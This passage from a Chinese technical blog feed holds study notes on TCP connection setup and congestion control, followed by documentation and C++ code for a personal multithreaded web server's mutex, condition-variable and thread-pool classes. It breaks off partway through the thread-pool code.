<p>对于这个问题，TCP规范中要求：**当主机B的接收窗口为0时，主机A继续发送只有一个字节数据的报文段，这些报文段将会被接收方确认。**等到最终主机B的缓存清空，返回的确认报文中将包含一个非零的 rwnd 值。</p>
</li>
</ul>
<h4 id="f-TCP-连接管理">f. TCP 连接管理</h4>
<ul>
<li>
<p>TCP连接流程</p>
<ul>
<li>
<p>客户端TCP首先向服务器端的TCP发送一个特殊TCP报文段。该报文段中不包含应用层数据，而是在报文段首部设置 <strong>SYN 比特为1</strong>. 该特殊报文段被称为 <strong>SYN 报文段</strong>。</p>
<p>同时，客户端会<strong>随机选择</strong>一个<strong>初始序号 client_isn</strong>，并将此编号放置进该起始的TCP SYN 报文段的<strong>序号字段</strong>中。</p>
<blockquote>
<p>注意：适当的随机选择 client_isn 在避免某些安全性攻击方面起到了一定的作用。</p>
</blockquote>
</li>
<li>
<p>当 TCP SYN 报文段到达服务器主机，则服务器会为该TCP连接<strong>分配 TCP 缓存和变量</strong>，并向该客户TCP发送允许连接的报文段。</p>
<blockquote>
<p>注意：提前分配缓存和变量可能受到 SYN 攻击。</p>
</blockquote>
<p>该报文段也不包含应用层数据，而是设置</p>
<ul>
<li><strong>SYN 比特为1</strong></li>
<li>TCP报文首部的<strong>确认号</strong>为 client_isn + 1</li>
<li>TCP报文首部的<strong>序号字段</strong>为 服务器的初始序号 server_isn 。</li>
</ul>
<p>该允许连接的报文段被称为 <strong>SYNACK报文段</strong>。</p>
</li>
<li>
<p>当客户端收到 SYNACK 报文段时，客户端也为该连接分配缓存和变量。之后客户端向服务器发送最后一个报文段，<strong>对服务器的允许连接报文进行确认</strong>（客户端将值server_isn + 1防止进TCP报文段首部的确认字段）。由于连接已经建立，因此<strong>SYN比特置0</strong>。</p>
<p>在这个确认报文中，<strong>可以带上客户端到服务器的数据</strong>。</p>
</li>
</ul>
<p>为了创建连接，TCP会在两台主机之间发送3个分组，因此这个连接过程通常称为<strong>三次握手</strong>。</p>
<p><img src="/2021/05/cnatda-1/image-20210515092421032.png" alt="image-20210515092421032"></p>
</li>
<li>
<p>TCP连接拆除</p>
<p>参与一条TCP连接的两个进程中的任何一个都能终止该连接。</p>
<p><img src="/2021/05/cnatda-1/image-20210515092825158.png" alt="image-20210515092825158"></p>
</li>
</ul>
<h4 id="g-拥塞控制原理">g. 拥塞控制原理</h4>
<ul>
<li>
<p>拥塞原因与代价</p>
<ul>
<li>
<p>假设主机A、B在容量为R的共享式输出链路上传播。当发送速率接近 R/2 时，平均使用时延将会越来越大。当发送速率超过 R/2 时，路由器中的平均排队分组数就会无限增长，源与目的地之间的平均时延也会变成无穷大。</p>
</li>
<li>
<p>发送方必须执行重传以补偿因为缓存溢出而丢弃的分组。</p>
</li>
<li>
<p>发送方在遇到大的时延时所进行的<strong>不必要重传</strong>会引起路由器利用其链路带宽来<strong>转发不必要的分组副本</strong>。</p>
</li>
<li>
<p>当一个分组沿着一条路径被丢弃时，每个上游路由器用于<strong>转发该分组到丢弃该分组</strong>而使用的传输容量最终被浪费掉了。</p>
</li>
</ul>
</li>
<li>
<p>拥塞控制方法</p>
<ul>
<li>端到端拥塞控制：由于网络层<strong>没有</strong>为运输层提供<strong>显式支持</strong>，因此即便网络中存在拥塞，端系统也必须通过对网络行为的观察来推断。例如通过超时或冗余ACK确认。</li>
<li>网络辅助的拥塞控制：在网络辅助的拥塞控制中，路由器向发送方提供关于网络中拥塞状态的显式反馈信息。这类拥塞信息从网络反馈到发送方通常有两种方式：
<ul>
<li>直接反馈信息：由网络路由器发给发送方。这种方式通常采用一种阻塞分组的形式。</li>
<li>更通用的第二种形式：路由器标记或更新从发送方流向接收方的分组中的某个字段来表示拥塞的产生。当收到一个标记的分组后，接收方就会向发送方通知该网络拥塞指示。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="h-TCP-拥塞控制">h. TCP 拥塞控制</h4>
<ul>
<li>
<p>TCP采用的方式是让每一个发送方<strong>根据所感知到的网络拥塞程度</strong>来限制其能向连接发送流量的速率。</p>
<p>运行在发送方的 TCP 拥塞控制机制跟踪一个额外的变量：<strong>拥塞窗口cwnd</strong>。它限制了一个TCP发送方能向网络中发送流量的速率。即 $LastByteSend - LastByteAcked &lt;= min{cwnd, rwnd}$。发送速率为$min{cwnd, wrnd} / RTT$ 字节/秒。</p>
</li>
<li>
<p>TCP发送方怎样确定它应当发送的速率?</p>
<ul>
<li>一个丢失的报文段表意味着拥塞。因此当丢失报文段时应当降低TCP发送方的速率。</li>
<li>一个确认报文段表示该网络正在向接收方交付发送方的报文段，因此当对先前为确认报文段的确认到达时，能够增加发送方的速率。</li>
<li>带宽探测。</li>
</ul>
</li>
<li>
<p>TCP拥塞控制算法</p>
<ul>
<li>
<p><strong>慢启动</strong></p>
<ul>
<li>
<p>慢启动起始阶段</p>
<p>在慢启动状态，cwnd的值以1个MSS开始并且每当传输的报文段首次被确认就增加1个MSS。这会使得每过一个RTT，发送速率就翻倍。</p>
<p>TCP发送速率起始慢，但在慢启动阶段以指数增长。</p>
</li>
<li>
<p>慢启动结束阶段</p>
<p>如果存在一个由<strong>超时指示</strong>的丢包事件（注意，不包括冗余指示的丢包），TCP发送方将cwnd设置为1并重新开始慢启动过程。同时还将第二个状态变量的值**ssthresh（慢启动阈值）**设置为 cwnd/2。</p>
<p>当cwnd的值等于 ssthresh 时，结束慢启动并且TCP转移到<strong>拥塞避免模式</strong>。此时TCP会更为谨慎的增加 cwnd。</p>
<p>如果检测到3个冗余ACK，则TCP执行快速重传并进入<strong>快速恢复</strong>状态。</p>
</li>
</ul>
</li>
<li>
<p><strong>拥塞避免</strong></p>
<p>一旦进入拥塞避免状态，cwnd的值大约是上次遇到拥塞时的值的一半，此时采用一种较保守的方法：<strong>每个RTT</strong>只将cwnd的值增加一个MSS。</p>
<blockquote>
<p>注意区分开，慢启动初始时是<strong>每个报文段被确认</strong>则增加一个MSS。而这里是<strong>每个RTT</strong>增加一个MSS。</p>
</blockquote>
<p>对于冗余ACK指示的丢包事件来说，TCP将cwnd减半，并且当收到3个冗余ACK时，将ssthresh的值记录为cwnd的值的一半。</p>
</li>
<li>
<p><strong>快速恢复</strong></p>
<ul>
<li>在快速恢复中，对于引进TCP进入快速恢复状态的缺失报文段，对收到的每个冗余ACK，cwnd的值增加一个MSS。最终当对丢失报文段的一个ACK到达时，TCP在降低cwnd后进入拥塞避免状态。</li>
<li>如果出现超时事件，快速恢复在执行如同在慢启动和拥塞避免中相同的动作后，迁移到慢启动状态：当丢包事件出现时，cwnd的值被设置为1个MSS，并且ssthresh的值设置为 cwnd 值的一半。</li>
</ul>
</li>
</ul>
<p><img src="/2021/05/cnatda-1/image-20210515131916271.png" alt="image-20210515131916271"></p>
</li>
<li>
<p>公平性</p>
<p>TCP会在多条连接之间平等共享带宽，但UDP因为没有拥塞控制机制，因此UDP源有可能容易压制TCP流量。</p>
</li>
<li>
<p>明确拥塞通告：网络辅助拥塞控制</p>
<ul>
<li>对于IP和TCP的扩展方案 RFC3168 允许网络明确向TCP发送方和接收方发出拥塞信号。这种形式的网络辅助拥塞控制称为<strong>明确拥塞通告（Explicit Congestion Notification, ECN）</strong>，涉及到TCP和IP协议。</li>
<li>在网络层，<strong>IP数据报</strong>首部的服务类型字段中的<strong>两个比特</strong>被用于ECN。路由器所使用的一种ECN比特设置表示该路由器<strong>正在历经阻塞</strong>。该阻塞标志则由被标记的IP数据报所携带，送给<strong>目的主机</strong>，再由<strong>目的主机</strong>通知<strong>发送主机</strong>。</li>
<li>RFC3168 推荐仅当拥塞持续不断存在时才设置 ECN比特。发送主机所使用的另一种ECN比特设置通知路由器发送方和接收方是ECN使能的，因此能够对ECN指示的网络拥塞中采取行动。</li>
<li>除了TCP以外的其他运输层协议也可以利用网络层发送ECN信号。</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>WebServer v1.0 文档</title>
    <url>/2021/05/WebServer-1/</url>
    <content><![CDATA[<h2 id="概述">概述</h2>
<p>WebServer 1.0 简单实现了一个基础的 <strong>多并发网络服务程序</strong> 。在该版本中，主要实现了以下重要内容：</p>
<ul>
<li>线程互斥锁 &amp; 条件变量的封装</li>
<li>线程池的设计，以支持并发</li>
<li>基础网络连接的实现</li>
<li>http 协议的简略支持
<ul>
<li>支持部分常用 HTTP 报文
<ul>
<li>200 OK</li>
<li>400 Bad Request</li>
<li>500 Internal Server Error</li>
<li>501 Not Implemented</li>
<li>505 HTTP Version Not Supported</li>
</ul>
</li>
<li>支持 HTTP GET 请求</li>
<li>支持 HTTP/1.1 <strong>持续连接</strong> 特性</li>
</ul>
</li>
</ul>
<p>1.0 版本的项目代码位于 <a href="https://github.com/Kiprey/WebServer/tree/4095ccc6fd3facd3988ea71178cacad7b4e0dd13" target="_blank" rel="noopener">Kiprey/WebServer CommitID: 4095cc - github</a></p>
<p>最新版本的项目代码位于 <a href="https://github.com/Kiprey/WebServer" target="_blank" rel="noopener">Kiprey/WebServer - github</a></p>
<a id="more"></a>
<p>运行示例：</p>
<p><img src="/2021/05/WebServer-1/image-20210512133857068.png" alt="image-20210512133857068"></p>
<blockquote>
<p>注意：该程序的实现大量参考了 <a href="https://github.com/linyacool/WebServer" target="_blank" rel="noopener">linyacool/WebServer - github</a> 的代码。</p>
</blockquote>
<h2 id="一、互斥锁-条件变量">一、互斥锁 &amp; 条件变量</h2>
<h3 id="1-互斥锁">1. 互斥锁</h3>
<p>对于当前的多线程程序来说，可能会出现多个线程同时读写同一个数据结构的情况，那么此时势必会造成脏读这种错误情况。而互斥锁的使用，是为了保证数据共享操作的完整性，确保任一时刻，只能有一个线程访问目标对象。</p>
<p>在linux中，互斥锁主要使用以下函数来实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化 mutex 对象</span></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_init</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">const</span> <span class="keyword">pthread_mutexattr_t</span> *<span class="keyword">restrict</span> attr)</span></span>;</span><br><span class="line"><span class="comment">// mutex 加锁，在获得锁之前将会阻塞</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_lock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br><span class="line"><span class="comment">// mutex 加锁，如果能马上获取锁则返回0，无法获取锁则马上返回errno</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_trylock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br><span class="line"><span class="comment">// mutex 释放锁</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_unlock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br><span class="line"><span class="comment">// 销毁 mutex 对象</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_destroy</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure>
<p>由于 pthread 族的库函数名称较长，并且调用方式也互不相同，因此在这些库函数上做了一个简单的封装：</p>
<blockquote>
<p>注意，这实际上就是<strong>RAII（资源获取即初始化）</strong>，是C++等编程语言常用的管理资源、避免内存泄露的方法。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief MutexLock 将 pthread_mutex 封装成一个类, </span></span><br><span class="line"><span class="comment"> *        这样做的好处是不用记住那些繁杂的 pthread 开头的函数使用方式</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MutexLock</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> mutex_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MutexLock()     &#123; pthread_mutex_init(&amp;mutex_, <span class="literal">nullptr</span>); &#125;</span><br><span class="line">    ~MutexLock()    &#123; pthread_mutex_destroy(&amp;mutex_); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span>     </span>&#123; pthread_mutex_lock(&amp;mutex_); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span>   </span>&#123; pthread_mutex_unlock(&amp;mutex_); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">pthread_mutex_t</span>* <span class="title">getMutex</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &amp;mutex_; &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>正常来说，我们使用锁时，需要经过以下过程：<strong>获取锁-&gt;进入临界区-&gt;释放锁</strong>。但在实际使用锁时，容易忘记释放锁，而这是一个非常严重的错误。因此我们可以实现一个 <code>MutexLockGuard</code>类，借助类的构造函数和析构函数，来帮助我们自动获取锁和释放锁，只需一个简单的声明即可<strong>获取锁&amp;释放锁</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief MutexLockGuard 主要是为了自动获取锁/释放锁, 防止意外情况下忘记释放锁</span></span><br><span class="line"><span class="comment"> *        而且块状的锁定区域更容易让人理解代码</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MutexLockGuard</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MutexLock&amp; lock_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 声明 MutexLockGuard 时自动上锁</span></span><br><span class="line"><span class="comment">     * @param lock 待锁定的资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MutexLockGuard(MutexLock&amp; mutex) : lock_(mutex) &#123; lock_.lock(); &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief 当前作用域结束时自动释放锁, 防止遗忘</span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    ~MutexLockGuard() &#123; lock_.unlock(); &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2-条件变量">2. 条件变量</h3>
<p>一说起条件变量，就不得不说先说起<strong>管程</strong>。管程保证了<strong>同一时刻只有一个线程在管程内活动</strong>，但<strong>不能保证</strong>线程在进入管程后，能继续一次性执行下去直到管程结束。</p>
<blockquote>
<p>例如某个线程好不容易进入了管程，但执行了一段时间，突然发现某个条件没有满足，使得当前线程必须阻塞，无法继续执行。但要是该线程原地阻塞，一直占用这个管程，那其他的线程自然就无法进入管程，造成死锁。</p>
</blockquote>
<p>那该怎么办呢？这就轮到条件变量出场了。</p>
<p>继续以上面的这个例子为例，由于该线程进入管程后可能会阻塞，因此非常肯定的是，必须在该进程进入阻塞状态前释放管程，否则会造成死锁。但是该线程已经进入管程，且没办法继续执行下去，因此只能<strong>原地释放管程</strong>，并等待<strong>条件</strong>满足后，<strong>重新获取管程锁</strong>，并将该线程唤醒，使其继续执行。</p>
<p>条件变量起到的作用，就相当于控制线程在管程中挂起和唤醒的作用。上面的语句可能有点难以理解，请思考一下这个例子：</p>
<blockquote>
<p>线程池中，当子线程需要读取事件队列来获取事件之前，需要先获取队列的锁。当子线程获取到锁以后，如果队列为空，则条件不满足（注意这里的条件是：<strong>队列非空</strong>），因此子线程就无法从中获取事件，没法继续执行。此时可以使用条件变量让子线程在管程中挂起，等到条件满足时再通过条件变量来唤醒，回到管程继续执行。</p>
<p>注意：使用条件变量时，一定要确保<strong>在已经获取到管程锁的前提下</strong>使用，否则条件变量容易被多个子线程修改/使用。</p>
</blockquote>
<p>条件变量相关的函数如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化条件变量</span></span><br><span class="line"><span class="keyword">pthread_cond_t</span> cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_init</span><span class="params">(<span class="keyword">pthread_cond_t</span> *<span class="keyword">restrict</span> cond,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> <span class="keyword">pthread_condattr_t</span> *<span class="keyword">restrict</span> attr)</span></span>;</span><br><span class="line"><span class="comment">// 唤醒 **至少一个** 被目标条件变量阻塞的线程</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_signal</span><span class="params">(<span class="keyword">pthread_cond_t</span> *cond)</span></span>;</span><br><span class="line"><span class="comment">// 唤醒 **所有** 被目标条件变量阻塞的线程</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_broadcast</span><span class="params">(<span class="keyword">pthread_cond_t</span> *cond)</span></span>;</span><br><span class="line"><span class="comment">// 让目标条件变量阻塞当前线程</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_wait</span><span class="params">(<span class="keyword">pthread_cond_t</span> *<span class="keyword">restrict</span> cond,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex)</span></span>;</span><br><span class="line"><span class="comment">// 让目标条件变量阻塞当前线程，并设置最大阻塞时间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_timedwait</span><span class="params">(<span class="keyword">pthread_cond_t</span> *<span class="keyword">restrict</span> cond,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">pthread_mutex_t</span> *<span class="keyword">restrict</span> mutex,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> struct timespec *<span class="keyword">restrict</span> abstime)</span></span>;</span><br><span class="line"><span class="comment">// 销毁条件变量</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_destroy</span><span class="params">(<span class="keyword">pthread_cond_t</span> *cond)</span></span>;</span><br></pre></td></tr></table></figure>
<p>与上面的互斥锁一样，这里也实现了一个 <code>Condition</code>类来简化条件变量的使用：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 条件变量,主要用于多线程中的锁 </span></span><br><span class="line"><span class="comment"> *        与 MutexLock 一致,无需记住繁杂的函数名称</span></span><br><span class="line"><span class="comment"> *        条件变量主要是与mutex进行搭配,常用于资源分配相关的场景,</span></span><br><span class="line"><span class="comment"> *        例如当某个线程获取到锁以后,发现没有资源,则此时可以释放资源并等待条件变量</span></span><br><span class="line"><span class="comment"> * @note  注意: 使用条件变量时,必须上锁,防止出现多个线程共同使用条件变量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Condition</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MutexLock&amp; lock_;       <span class="comment">// 目标 Mutex 互斥锁</span></span><br><span class="line">    <span class="keyword">pthread_cond_t</span> cond_;   <span class="comment">// 条件变量</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Condition(MutexLock&amp; mutex) : lock_(mutex) &#123; pthread_cond_init(&amp;cond_, <span class="literal">nullptr</span>); &#125;</span><br><span class="line">    ~Condition()        &#123; pthread_cond_destroy(&amp;cond_); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">()</span>       </span>&#123; pthread_cond_signal(&amp;cond_); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">notifyAll</span><span class="params">()</span>    </span>&#123; pthread_cond_broadcast(&amp;cond_); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">wait</span><span class="params">()</span>         </span>&#123; pthread_cond_wait(&amp;cond_, lock_.getMutex()); &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  @brief  等待当前的条件变量一段时间</span></span><br><span class="line"><span class="comment">     *  @param  sec 等待的时间(单位:秒)</span></span><br><span class="line"><span class="comment">     *  @return 成功在时间内等待到则返回 true, 超时则返回 false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">waitForSeconds</span><span class="params">(<span class="keyword">size_t</span> sec)</span>   </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        timespec abstime;</span><br><span class="line">        <span class="comment">// 获取当前系统真实时间</span></span><br><span class="line">        clock_gettime(CLOCK_REALTIME, &amp;abstime);</span><br><span class="line">        abstime.tv_sec += (<span class="keyword">time_t</span>)sec;</span><br><span class="line">        <span class="keyword">return</span> ETIMEDOUT != pthread_cond_timedwait(&amp;cond_, lock_.getMutex(), &amp;abstime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="二、线程池">二、线程池</h2>
<h3 id="1-概述">1. 概述</h3>
<ul>
<li>
<p>线程池是一种多线程的处理方式，常常用在高并发服务器上。线程池可以有效的利用高并发服务器上的线程资源。</p>
</li>
<li>
<p>线程用于处理各个请求，其流程大致为：<strong>创建线程 =&gt; 传递信息至子线程 =&gt; 线程分离 =&gt; 线程运行 =&gt; 线程销毁</strong>。对于较小规模的通信来说，上述的这个流程可以满足基本需求。但是对于高并发服务器来说，重复的创建线程与销毁线程，其开销不可忽视。因此可以使用线程池来让线程复用。</p>
</li>
</ul>
<h3 id="2-实现前的准备工作">2. 实现前的准备工作</h3>
<ul>
<li>
<p>对于一个线程所要执行的任务，我们需要明确以下几点：</p>
<ul>
<li>当前线程所要执行的函数，最好是与主线程没有较大关联的，即尽量降低耦合性。</li>
</ul>
</li>
<li>
<p>所要执行的事件，可以传入一个参数，但需要明确<strong>不能有返回值</strong>。</p>
<blockquote>
<p>要想有应该也可以做，不过这就是后面的事情了。</p>
</blockquote>
<p>因此，我们便可以设计出以下的 task 结构体</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每个线程的基本事件单元</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadpoolTask</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*function)(<span class="keyword">void</span>*);</span><br><span class="line">    <span class="keyword">void</span>* arguments;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>线程池除了一些特定的变量（线程个数、事件队列等等）以外，还需要<strong>互斥锁</strong>以及<strong>条件变量</strong>。</p>
<ul>
<li>对于每个线程来说，这些线程是有可能同时访问线程池，因此需要在每个线程访问之前<strong>加以上锁</strong>。</li>
<li>上锁之后，对于每个线程来说，有可能出现这种<strong>获取到锁，但没有事件可以执行</strong>的情况。对于这类情况，子线程必须先释放锁等待事件的到来，等到事件到来之后再重新上锁，获取事件，而这就是<strong>条件变量</strong>的用处。</li>
</ul>
</li>
</ul>
<h3 id="3-子线程的目标函数">3. 子线程的目标函数</h3>
<p>由于子线程只会在<strong>线程池创建之时创建</strong>，在<strong>线程池销毁之时销毁</strong>，因此，在子线程中必然要执行一个事件循环，其中重复执行 <strong>获取事件、执行事件</strong> 的动作。</p>
<p>但这里需要注意两件事情，</p>
<ol>
<li>获取事件时，需要给线程池上锁，因为要访问消息队列；必要时刻还需要设置条件变量来暂时释放锁。</li>
<li>当线程池被销毁时，子线程该如何终止？</li>
</ol>
<p>针对问题2，有两种方式：</p>
<ol>
<li>一种是在线程池设置一个标志，子线程定期轮询该标志以确认是否退出。</li>
<li>再一种就是当前所实现的：添加一个<strong>退出事件</strong>至事件队列中，子线程执行到该事件时自动退出。</li>
</ol>
<p>因此具体实现的代码如下所示：</p>
<blockquote>
<p>注意，<code>pthread_cond_signal</code> 会唤醒<strong>至少</strong>一个线程，注意是<strong>至少</strong>。因此可能会出现唤醒多个线程但只有一个事件等待处理的情况。针对于这种情况，只需设置子线程在被唤醒后，循环检测是否有剩余事件等待处理即可。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">ThreadPool::TaskForWorkerThreads_</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ThreadPool* pool = (ThreadPool*)arg;</span><br><span class="line">    <span class="comment">// 启动当前线程</span></span><br><span class="line">    ThreadpoolTask task;</span><br><span class="line">    <span class="comment">// 对于子线程来说,事件循环开始</span></span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 首先获取事件</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取事件时需要上个锁</span></span><br><span class="line">            <span class="function">MutexLockGuard <span class="title">guard</span><span class="params">(pool-&gt;threadpool_mutex_)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/** </span></span><br><span class="line"><span class="comment">             * 如果好不容易获得到锁了,但是没有事件可以执行</span></span><br><span class="line"><span class="comment">             * 则陷入沉睡,释放锁,并等待唤醒</span></span><br><span class="line"><span class="comment">             * <span class="doctag">NOTE:</span> 注意, pthread_cond_signal 会唤醒至少一个线程</span></span><br><span class="line"><span class="comment">             *       也就是说,可能存在被唤醒的线程仍然没有事件处理的情况</span></span><br><span class="line"><span class="comment">             *       这时只需循环wait即可.</span></span><br><span class="line"><span class="comment">             */</span> </span><br><span class="line">            <span class="keyword">while</span>(pool-&gt;task_queue_.size() == <span class="number">0</span>)</span><br><span class="line">                pool-&gt;threadpool_cond_.wait();</span><br><span class="line">            <span class="comment">// 唤醒后一定有事件</span></span><br><span class="line">            assert(pool-&gt;task_queue_.size() != <span class="number">0</span>);</span><br><span class="line">            task = pool-&gt;task_queue_.front();</span><br><span class="line">            pool-&gt;task_queue_.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行事件</span></span><br><span class="line">        (task.function)(task.arguments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意: UNREACHABLE, 控制流不可能会到达此处</span></span><br><span class="line">    <span class="comment">// 因为线程的退出不会走这条控制流,而是执行退出事件</span></span><br><span class="line">    assert(<span class="number">0</span> &amp;&amp; <span class="string">"TaskForWorkerThreads_ UNREACHABLE!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-创建线程池">4. 创建线程池</h3>
<p>创建线程池较为简单，直接循环创建线程即可。</p>
<p>需要注意的是，这里设置了销毁线程池时的处理方式。具体信息将在下面<strong>销毁线程池</strong>的那部分中详细讲解。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ThreadPool::ThreadPool(<span class="keyword">size_t</span> threadNum, ShutdownMode shutdown_mode, <span class="keyword">size_t</span> maxQueueSize)</span><br><span class="line">        : threadNum_(threadNum),</span><br><span class="line">          maxQueueSize_(maxQueueSize), </span><br><span class="line">          <span class="comment">// 使用 类成员变量 threadpool_mutex_ 来初始化 threadpool_cond_</span></span><br><span class="line">          threadpool_cond_(threadpool_mutex_), </span><br><span class="line">          shutdown_mode_(shutdown_mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 开始循环创建线程 </span></span><br><span class="line">    <span class="keyword">while</span>(threads_.size() &lt; threadNum_)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> thread;</span><br><span class="line">        <span class="comment">// 如果线程创建成功,则将其压入栈内存中</span></span><br><span class="line">        <span class="keyword">if</span>(!pthread_create(&amp;thread, <span class="literal">nullptr</span>, TaskForWorkerThreads_, <span class="keyword">this</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            threads_.push_back(thread);</span><br><span class="line">            <span class="comment">// // 注意这里只修改已启动的线程数量</span></span><br><span class="line">            <span class="comment">// startedThreadNum_++;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-添加事件">5. 添加事件</h3>
<p>添加新事件时，需要设置一下锁，防止脏读。在新事件添加完成后，使用条件变量来唤醒其中某一个空闲线程以执行新事件。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ThreadPool::appendTask</span><span class="params">(<span class="keyword">void</span> (*function)(<span class="keyword">void</span>*), <span class="keyword">void</span>* arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 由于会操作事件队列,因此需要上锁</span></span><br><span class="line">    <span class="function">MutexLockGuard <span class="title">guard</span><span class="params">(threadpool_mutex_)</span></span>;</span><br><span class="line">    <span class="comment">// 如果队列长度过长,则将当前task丢弃</span></span><br><span class="line">    <span class="keyword">if</span>(task_queue_.size() &gt; maxQueueSize_)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 添加task至列表中</span></span><br><span class="line">        ThreadpoolTask task = &#123; function, arguments &#125;;</span><br><span class="line">        